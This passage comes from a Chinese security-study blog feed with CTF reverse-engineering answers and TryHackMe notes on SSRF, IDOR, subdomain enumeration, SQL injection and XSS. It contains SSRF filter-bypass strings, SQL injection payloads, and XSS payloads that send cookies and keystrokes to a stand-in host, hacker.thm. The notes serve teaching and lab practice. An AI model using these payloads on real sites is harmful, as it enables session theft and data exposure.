( i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v4 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        *((_BYTE *)Dst + v4) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v7 = v4 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v5 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v5) = aAbcdefghijklmn[<span class="number">64</span>];</span><br><span class="line">        v7 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(<span class="type">signed</span> <span class="type">int</span>)(<span class="type">unsigned</span> __int8)byte_41A144[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">        v6 = v7 + <span class="number">1</span>;</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>) | <span class="number">16</span> * (byte_41A144[<span class="number">0</span>] &amp; <span class="number">3</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[<span class="number">2</span>] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>) | <span class="number">4</span> * (byte_41A144[<span class="number">1</span>] &amp; <span class="number">0xF</span>)];</span><br><span class="line">        *((_BYTE *)Dst + v6) = aAbcdefghijklmn[byte_41A144[<span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">        v7 = v6 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  *((_BYTE *)Dst + v7) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> Dst;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现<code>aAbcdefghijklmn</code>出现多次，双击查看</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907110655390.png" alt="image-20220907110655390"><figcaption aria-hidden="true">image-20220907110655390</figcaption></figure><p>猜测为base64加密，回到<code>main_0</code>函数中继续分析，猜测第25行的变量<code>Dest</code>的值为经过base64加密后的值，第27~28行<code>Dest</code>经过for循环处理，然后在第30行与<code>Str</code>进行比较，若相同则正确，说明<code>Str</code>的值与通过for循环处理的<code>Dest</code>的值相同，双击查看<code>Str</code>，发现</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907115838190.png" alt="image-20220907115838190"><figcaption aria-hidden="true">image-20220907115838190</figcaption></figure><p>编写脚本得到for循环处理前的<code>Dest</code>，再通过base64解码，得到flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">'e3nifIH9b_C@n@dH'</span></span><br><span class="line">s=<span class="built_in">list</span>(s)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i]=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])-i)</span><br><span class="line">    flag+=s[i]</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></tbody></table></figure><p><code>flag{i_l0ve_you}</code></p><h3 id="树木的小秘密">4.树木的小秘密</h3><p>参考：https://blog.csdn.net/qq_26961571/article/details/123334669</p><ul><li>本题学到的新知识：<a href="https://so.csdn.net/so/search?q=PyInstaller&amp;spm=1001.2101.3001.7020">PyInstaller</a>是一个跨平台的Python应用打包工具，支持Windows/Linux/MacOS三大主流平台，能够把 Python 脚本及其所在的 Python解释器打包成可执行文件，从而允许最终用户在无需安装 Python的情况下执行应用程序。 PyInstaller制作出来的执行文件并不是跨平台的，如果需要为不同平台打包，就要在相应平台上运行PyInstaller进行打包。</li></ul><p>打开附件压缩包发现exe文件，用Exeinfo PE打开文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907123643112.png" alt="image-20220907123643112"><figcaption aria-hidden="true">image-20220907123643112</figcaption></figure><p>利用IDA64打开文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907123925712.png" alt="image-20220907123925712"><figcaption aria-hidden="true">image-20220907123925712</figcaption></figure><p>看来看去还是毫无思路，于是搜索别人的wp，发现本题的exe文件是由pyinstaller 这个工具打包的，所以要利用工具<a href="https://nchc.dl.sourceforge.net/project/pyinstallerextractor/dist/pyinstxtractor.py">pyinstxtractor.py</a>进行反编译</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907171906770.png" alt="image-20220907171906770"><figcaption aria-hidden="true">image-20220907171906770</figcaption></figure><p>得到一个文件夹，发现多个文件，其中一个文件名为123</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907172221181.png" alt="image-20220907172221181"><figcaption aria-hidden="true">image-20220907172221181</figcaption></figure><p>打开该文件，发现一些乱码</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220907172336470.png" alt="image-20220907172336470"><figcaption aria-hidden="true">image-20220907172336470</figcaption></figure><p>其中包含一段base64编码，解码后得到<code>flag{my_name_is_shumu}</code>。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>本地部署ctf-wiki</title>
    <link href="/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/"/>
    <url>/2023/06/25/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2ctf-wiki/</url>
    
    <content type="html"><![CDATA[<p>首先打开 ctf-wiki 的GitHub仓库https://github.com/ctf-wiki/ctf-wiki/blob/master/README-zh_CN.md</p><p>根据步骤操作，这里我用的是第一种方法：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 1. clone</span><br><span class="line">git clone https://github.com/ctf-wiki/ctf-wiki.git</span><br><span class="line"># 2. requirements</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># generate static file in site/</span><br><span class="line">python3 scripts/docs.py build-all        &lt;-----如果是Windows，使用'python'而不是'python3'</span><br><span class="line"># deploy at http://127.0.0.1:8008</span><br><span class="line">python3 scripts/docs.py serve</span><br></pre></td></tr></tbody></table></figure><p>在运行<code>python scripts/docs.py build-all</code>时发生报错：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: module 'jinja2' has no attribute 'contextfilter'</span><br></pre></td></tr></tbody></table></figure><p>根据这篇<a href="https://forums.docker.com/t/jinja-mkdocs-issue-breaks-docker101tutorial/122671">文章</a>，我进行了修改，首先使用<code>pip uninstall jinja2</code>删除存在的<code>jinja2</code>，然后打开<code>requirements.txt</code>文件，在最后一行添加<code>jinja2==3.0.3</code>，重新运行<code>pip install -r requirements.txt</code>，然后再次运行<code>python scripts/docs.py build-all</code>，成功解决报错，继续运行<code>python scripts/docs.py serve</code>，会出现</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: this is a very simple server.</span><br><span class="line">For development, use the command live instead.</span><br><span class="line">This is here only to preview a site with translations already built.</span><br><span class="line">Make sure you run the build-all command first.</span><br><span class="line">Serving at: http://127.0.0.1:8008</span><br></pre></td></tr></tbody></table></figure><p>此时在浏览器中打开<code>http://127.0.0.1:8008</code>即可访问ctf-wiki。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/06/10/SSRF/"/>
    <url>/2023/06/10/SSRF/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/ssrfqi</p><p>参考https://www.cnblogs.com/Hekeats-L/p/16919147.html</p><h2 id="introduction">Introduction</h2><h3 id="what-is-an-ssrf">What is an SSRF</h3><p>SSRF 是 服务端请求伪造（Server-Side RequestForgery）的缩写。这个漏洞使得恶意用户能够使web服务器向该恶意用户选择的资源提出额外的HTTP请求。攻击者通过滥用服务器功能来访问或操作无法被直接访问的信息。</p><h3 id="types-of-ssrf">Types of SSRF</h3><ol type="1"><li>第一种是常规类型的 SSRF，数据会返回给攻击者</li><li>第二种是 <strong>Blind SSRF</strong>，攻击者无法看见相关信息和数据</li></ol><h3 id="whats-the-impact">What's the impact</h3><p>SSRF攻击可能会导致以下情况的发生：</p><ul><li>能够访问未经授权的区域</li><li>能够访问客户/组织的数据</li><li>能够进入内网</li><li>泄露身份验证令牌/凭证</li></ul><h2 id="finding-an-ssrf">Finding an SSRF</h2><p>潜在的SSRF漏洞可以通过多种方式在web应用程序中发现，下面是四个常见的示例：</p><ol type="1"><li><p>地址栏中的参数使用完整的 URL：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111655039.png" alt="image-20230104111655039"><figcaption aria-hidden="true">image-20230104111655039</figcaption></figure></li><li><p>表单中的<strong>隐藏</strong>字段：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111818606.png" alt="image-20230104111818606"><figcaption aria-hidden="true">image-20230104111818606</figcaption></figure></li><li><p>地址栏中的参数使用部分 URL 例如主机名：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104111932658.png" alt="image-20230104111932658"><figcaption aria-hidden="true">image-20230104111932658</figcaption></figure></li><li><p>只包含路径的 URL：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230104112014478.png" alt="image-20230104112014478"><figcaption aria-hidden="true">image-20230104112014478</figcaption></figure></li></ol><p>上述示例是一些比较容易利用的漏洞，这些位置都是经过大量反复实验得到的。</p><p>如果是 <strong>Blind SSRF</strong>，则不会有输出反馈，这时需要用到外部 HTTP记录工具来监视请求，例如：网站https://requestbin.com/，你自己的HTTP服务器，以及 Burp Suite 的 Collaborator 客户端。</p><h2 id="defeating-common-ssrf-defenses绕过ssrf防御">Defeating CommonSSRF Defenses（绕过SSRF防御）</h2><p>安全意识更高的开发人员会在其应用程序中添加 SSRF的漏洞检测，通常有两种方式：建立拒绝列表（denylist）；建立允许列表（allow list）。</p><h3 id="deny-list">Deny LIst</h3><p>拒绝列表是指除了列表中指定的资源与特定模式匹配的资源外，其他所有请求均接受。Web应用程序可以使用拒绝列表来保护敏感的端点、IP地址或域名不被公众访问，同时允许访问其他公开的资源。限制访问的特定端点是<strong>localhost</strong>，它可能包含服务器性能数据或一些敏感信息，因此<strong>localhost</strong>、<strong>127.0.0.1</strong>等域名可能会被记录在拒绝列表中。攻击者可以使用一些替代性的字符串表示<strong>localhost</strong>，例如：<code>0</code>，<code>0.0.0.0</code>，<code>0000</code>，<code>127.1</code>，<code>127.*.*.*</code>，<code>2130706433</code>，<code>017700000001</code>，或具有解析为<code>127.0.0.1</code>的DNS 记录的子域名，例如<code>127.0.0.1.nip.io</code>。</p><p>此外，在云环境中，阻止对IP地址<code>169.254.169.254</code>的访问十分重要，该访问包含用于已部署的云服务器的元数据，元数据中可能包含敏感信息。攻击者可在自己的域上注册一个子域来绕过检验，该子域的DNS记录指向IP地址<code>169.254.169.254</code>。</p><h3 id="allow-list">Allow List</h3><p>除了出现在允许列表中的资源以及与特定模式匹配的资源外，其他所有的请求均不接受。例如参数中的URL必须以<code>https://website.thm</code>作为开头。攻击者可以通过在自己的域上注册子域(例如：<code>https://website.thm.attackers-domain.thm</code>)来绕过检验。应用程序逻辑上允许该子域输入并允许攻击者控制内部HTTP请求。</p><h3 id="open-redirect开放重定向">Open Redirect（开放重定向）</h3><p>如果上述方法均不起作用，攻击者还可以使用<strong>开放重定向</strong>这一技巧。开放重定向是服务器上的一个端点，网站访问者会被自动定向到另一个网址。以链接<code>https://website.thm/link?url=https://tryhackme.com</code>为例，创建此端点是为了记录访问者单击此链接的次数。但是如果该网站具有严格的规则，仅允许URL以<code>https://website.thm/</code>作为开头，那么可能存在一个潜在的SSRF漏洞，攻击者可以尝试将目标服务器的内部HTTP请求重定向到攻击者输入的域。</p><p>SSRF示例详见https://www.cnblogs.com/Hekeats-L/p/16919147.html</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Subdomain Enumeration（子域名枚举）</title>
    <link href="/2023/06/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/"/>
    <url>/2023/06/10/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9E%9A%E4%B8%BE/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/subdomainenumeration</p><h2 id="brute-force蛮力法">Brute Force(蛮力法)</h2><p>基于字典的枚举找到通用名称子域。<strong>DNSRecon</strong>是一个功能强大的DNS枚举工具，它的一个功能是使用预定义的字典进行子域枚方法侦查子域。</p><h2 id="osint-open-source-intelligence">OSINT (Open-SourceIntelligence)</h2><h3 id="ssltls-certificates">SSL/TLS Certificates</h3><p>在证书透明度 (CT) 下，证书颁发机构 (CA)必须在公共日志中发布他们颁发的所有 SSL/TLS 证书，任何人都可以查看 CT日志并找到为域颁发的证书。</p><p>证书透明度 (CT) 日志按设计包含由参与 CA为任何给定域颁发的所有证书。SSL/TLS证书一般包含域名、子域名和电子邮件地址。</p><p>查找CTlogs：https://crt.sh/，https://ui.ctsearch.entrust.com/ui/ctsearchui</p><h3 id="search-engine">Search Engine</h3><p>在谷歌中使用<code>-site:www.domain.com site:*.domain.com</code>，该语法可以查找到相关子域名。</p><h3 id="sublist3r"><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></h3><p>通过搜集子域名信息，找到目标的关联网站。</p><h2 id="virtual-host">Virtual Host</h2><p>有些子域并不总是托管在可公开访问的DNS结果中，例如web应用程序的开发版本或管理门户。相反，DNS记录可以保存在私有DNS服务器上，或记录在开发人员的计算机上的/etc/hosts文件（或windows用户的c:）中，DNS记录将域名映射到IP地址上。</p><p>web服务器可以在一个服务器上托管多个网站，当客户端请求网站时，服务器可以通过Host header 得知客户端请求的网站，我们可以通过修改 Host header以寻找新的域名。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>子域名枚举</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDOR</title>
    <link href="/2023/06/10/IDOR/"/>
    <url>/2023/06/10/IDOR/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/idor</p><h2 id="what-is-an-idor">What is an IDOR</h2><p><strong>IDOR</strong>，Insecure Direct ObjectReference，翻译过来就是<strong>不安全的直接对象引用</strong>，该漏洞是访问控制漏洞(accesscontrol vulnerability)的一种。</p><p>当web服务器接收到用户提供的输入来检索对象（文件、数据、文档）时，对用户输入数据的信任度过高，并且在服务端未进行验证，则可能会导致此类漏洞的发生。</p><h2 id="an-idor-example">An IDOR Example</h2><p>假设你刚注册了一项在线服务，并且想要更改个人信息，点击相关按钮后跳转到<code>http://online-service.thm/profile?user_id=1305</code>，在该页面你能修改个人信息。好奇心驱使你尝试修改<code>user_id</code>的值，令你惊讶的是，你竟然可以看到其他用户的个人信息。这样的漏洞属于IDOR漏洞。</p><h2 id="finding-idors-in-encoded-ids">Finding IDORs in Encoded IDs</h2><p>在网页之间通过<strong>post data</strong>、<strong>querystrings</strong>或<strong>cookie</strong>等方式传递数据时，开发人员通常会将数据进行编码，编码是为了web服务器能够理解用户传递的数据。常见的编码有<strong>base64</strong>，解码网站为：https://www.base64decode.org。可以通过修改编码内容并重新提交请求以查看是否包含IDOR漏洞。</p><h2 id="finding-idors-in-hashed-ids">Finding IDORs in Hashed IDs</h2><p>哈希加密后的ID一般比编码后的ID更加复杂，但也是遵循一种可预测的模式。</p><p>可以利用https://crackstation.net在线网站查询。</p><h2 id="finding-idors-in-unpredictable-ids">Finding IDORs inUnpredictable IDs</h2><p>若是无法在 ID中找到规律，即不可预测的，可以通过创建两个账户，并且交换它们的 ID号，来判断是否存在IDOR漏洞。</p><h2 id="where-are-idors-located">Where are IDORs located</h2><p>攻击点可能不总是在地址栏中，可能在 <strong>AJAX请求</strong>或者<strong>JavaScript文件</strong>中。例如，你可能会注意到访问<code>/user/details</code>会显示你的用户信息（通过session进行身份验证）。但是，通过参数挖掘，你可以发现一个称为<code>user_id</code>的参数，你可以通过修改此参数来显示其他用户的信息，例如<code>/user/details?user_id = 123</code>。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>IDOR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入（SQLi）</title>
    <link href="/2023/06/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/sqlinjectionlm</p><h2 id="introduction">Introduction</h2><p>使用 SQL 的web应用程序可以转变为 SQL注入的关键点在于用户提供的数据被包含在 SQL 查询中。</p><p>假设，你遇到了一个在线博客，每个博客条目都有一个唯一的 id号，博客条目可以设置为公共或私有，这取决于它们是否已经准备好公开发布，博客条目的URL 可能如下所示：</p><p><code>https://website.thm/blog?id=1</code></p><p>从上面的 URL 中，你可以看到所选的博客条目来自查询字符串(querystring)中的 id参数。Web应用程序需要从数据库中检索文章，并使用如下的SQL语句：</p><p><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p><p>发现上面的SQL语句正在博客表中查找 id 号为 1且<code>private</code>列设置为 0的文章，这意味着它可以被公众查看，并且使用了<code>limit</code>将结果限制为只有一个匹配项。</p><p>正如在本文开头所提到的，当用户输入的数据被引入数据库查询时，就会引入SQL注入。在本例中，查询字符串中的id 参数直接用于 SQL 查询。</p><p>假设文章 id 2仍然锁定为私有的，所以它不能在网站上查看。我们现在可以将 URL 改为：</p><p><code>https://website.thm/blog?id=2;--</code></p><p>对应生成的 SQL 语句为：</p><p><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p><p>URL 中的分号表示 SQL语句的结束，两个横杠(<code>--</code>)会导致之后的所有内容都被视为注释。通过这样做，实际上是在运行查询：</p><p><code>SELECT * from blog where id=2;--</code></p><p>无论是否将其设置为公开，它将返回 id 为 2 的文章。</p><h2 id="分类">分类</h2><h3 id="in-band-sqli">In-Band SQLi</h3><p>In-Band SQL 注入是最容易检测和利用的类型。In-Band是指使用相同通信方法来利用漏洞并接受结果。例如，在网页上发现 SQL注入漏洞，然后能够从数据库中将数据提取到同一页面。</p><ul><li><p><strong>Error-Based SQL Injection</strong>(基于报错的SQL注入)</p><p>这种类型的 SQL注入对于轻松获取有关数据库结构的信息是最有用的，因为来自数据库的错误信息会直接打印到网页上，这通常可以用于枚举整个数据库。</p></li><li><p><strong>Union-Based SQL Injection</strong>(基于 union的SQL注入)</p><p>这种类型的注入使用 UNION 操作符和 SELECT语句一起向页面返回其他结果。这是通过SQL注入漏洞提取大量数据的最常见方法。</p></li></ul><h3 id="blind-sqli">Blind SQLi</h3><p>与 in-band SQL 注入不同，blind SQL注入几乎没有反馈来提示我们我们是否注入成功，这是因为错误消息已被禁用，但无论如何，注入依旧是有效的。</p><ul><li><p>Authentication Bypass(身份验证绕过)</p><p>最直接的 blind SQLi技巧之一就是绕过登录表单等身份验证。连接到用户数据库的登录表单通常以这样的方式开发，即：web应用程序对用户名和密码的内容不感兴趣，而等关注两者是否在用户表中匹配。基本上，web应用程序会询问数据库“您是否是用户名为<strong>bob</strong> 、密码为 <strong>bob123</strong>的用户？”，数据库会回答“是”或“否”，并根据回答决定web应用程序是否允许你继续操作。</p></li><li><p><strong>Boolean Based</strong>(布尔盲注)</p><p>布尔盲注是指我们从注入尝试中收到的可能是<code>true/false</code>、<code>yes/no</code>、<code>on/off</code>、<code>1/0</code>或者任何只能有两个结果的响应。该结果表明攻击者的SQL注入是否成功。虽然响应只有两种结果，但还是能够枚举整个数据库的结构和内容。</p><p>例如，可以通过布尔盲注来判断数据库的首字母(<code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code>)。</p></li><li><p><strong>Time Based</strong>(时间盲注)</p><p>时间盲注与上述的布尔盲注非常相似，因为发送相同的请求，但没有直观的指示您的查询是错误的还是正确的。相反，正确查询的指标是基于完成查询所需的时间。这种时间延迟是通过在UNION 语句旁边使用内置方法（如<strong>SLEEP(x)</strong>）引入的。SLEEP() 方法只能在 UNION SELECT语句成功时执行。</p><p>例如，当试图确定表中的列数时，可以使用以下查询：</p><p><code>admin123' UNION SELECT SLEEP(5)</code></p><p>如果未产生停顿，那么我们可以推断出该请求未成功，所以我们增加一列：</p><p><code>admin123' UNION SELECT SLEEP(5),2;--</code></p><p>直到产生 5 秒延迟为止。</p></li></ul><h3 id="out-of-band-sqli">Out of Band SQLi</h3><p>此类 SQL注入并不常见，因为它要么取决于数据库服务器上启用的特定功能，要么取决于web应用程序的业务逻辑，后者根据SQL查询的结果进行某种外部网络调用。</p><p>Out-Of-Band攻击通过两个不同的通信渠道进行分类，一个用于发起攻击，另一个用于收集结果。例如，攻击通道可以是web请求，数据收集通道可以监视对你控制的服务发出的HTTP/DNS请求。</p><p>1） 攻击者通过注入 payload 向易受攻击的网站发出请求。</p><p>2） 该网站对数据库进行SQL查询，并传递黑客的 payload 。</p><p>3） payload包含一个请求，该请求强制将包含数据库数据的HTTP请求返回给黑客的计算机。</p><h2 id="预防措施">预防措施</h2><h3 id="预编译语句参数化查询">预编译语句（参数化查询）</h3><p>开发人员首先编写 SQL查询，然后将任何用户输入作为参数添加。编写准备好的语句可以确保 SQL代码结构不变，并且数据库可以区分查询和数据。作为一个好处，它还使您的代码看起来更干净、更容易阅读。</p><h3 id="对输入进行验证">对输入进行验证</h3><p>输入验证可以在很大程度上保护输入到 SQL查询中的内容。使用允许列表可以将输入限制为仅某些字符串，或者编程语言中的字符串替换方法可以过滤你希望允许或不允许的字符。</p><h3 id="对用户输入进行转义">对用户输入进行转义</h3><p>允许用户输入包含诸如<code>'</code>、<code>"</code>、<code>$</code>、<code>\</code>之类的字符可能会导致SQL查询中断，或者更糟的是，正如我们所了解的那样，打开它们以接受注入攻击。转义用户输入是在这些字符前面加上反斜杠（）的方法，这样会导致它们被解析为常规字符串而不是特殊字符。</p>]]></content>
    
    
    <categories>
      
      <category>TryHackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TryHackMe</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/06/10/XSS/"/>
    <url>/2023/06/10/XSS/</url>
    
    <content type="html"><![CDATA[<p>TryHackMe实验房间：https://tryhackme.com/room/xssgi</p><h2 id="introduction">Introduction</h2><p><strong>XSS</strong> 即跨站脚本攻击(Cross-SiteScripting)是一种注入攻击，将恶意的 JavaScript语句注入到web应用程序中，使得其他用户执行该恶意代码。</p><h2 id="xss-payloads">XSS Payloads</h2><p>在 XSS 中，payload 是我们希望执行在目标计算机上的 JavaScript代码。Payload 包含两部分：intention 和 modification。</p><p>Intention 就是你希望 JavaScript 代码执行的操作，而 modification则是我们需要基于不同情况对代码的更改。</p><p>下面是一些常见的 XSS intention。</p><h3 id="proof-of-concept概念验证">Proof Of Concept（概念验证）</h3><p>利用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof OfConcept的缩写）。</p><p>这是最简单的payload，通常是通过在web页面上弹出带有文本的警告框来实现的。例如：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="title function_">alert</span>(<span class="string">'XSS'</span>); &lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="session-stealingsession会话窃取">SessionStealing（session会话窃取）</h3><p>用户会话的详细信息（例如登录token）通常保存在目标计算机上的 cookie中。下面的JavaScript代码获取目标计算机的 cookie 后，使用 base64对其进行编码以保证成功传输，然后将其发送到攻击者控制的网站上以便记录。一旦攻击者拥有这些cookie，他们就可以接管目标的会话并作为目标用户登录。</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/steal?cookie='</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="key-logger键盘记录">Key Logger（键盘记录）</h3><p>下面的代码充当了键盘记录器，意味着目标在网页上键入的任何内容都将被发送到黑客控制的网站。如果将该类型的payload被放置在目标网站上用于接收用户登录或信用卡详细信息，这可能会造成很大的损失。</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) { <span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/log?key='</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );}&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="business-logic业务逻辑">Business Logic（业务逻辑）</h3><p>这个类型的 payload 会调用特定的网络资源或 JavaScript函数，例如一个用于更改用户电子邮件的 JavaScript函数<code>user.changeEmail()</code>，payload 如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">'attacker@hacker.thm'</span>);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><p>现在，目标邮件地址已被更改，攻击者可以重置密码，实现攻击。</p><h2 id="types-of-xss">Types Of XSS</h2><h3 id="reflected-xss反射型xss">Reflected XSS（反射型XSS）</h3><p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型XSS。</p><ul><li><p>示例：</p><p>一个网站，如果输入不符合规范的字符串，就会显示错误信息，而错误信息的内容是从查询字符串（querystring）中的 <strong>error</strong>参数获取的，并直接构建到页面源中。</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002430576.png" alt="image-20230110002430576"><figcaption aria-hidden="true">image-20230110002430576</figcaption></figure><p>应用程序不检查 <strong>error</strong>参数中的内容，使得攻击者可以插入恶意代码，如下图所示：</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002600690.png" alt="image-20230110002600690"><figcaption aria-hidden="true">image-20230110002600690</figcaption></figure></li><li><p>潜在影响：</p><p>攻击者可以在另一个网站上发送链接或将其嵌入另一个包含JavaScriptpayload的网站上的 <strong>iframe</strong> 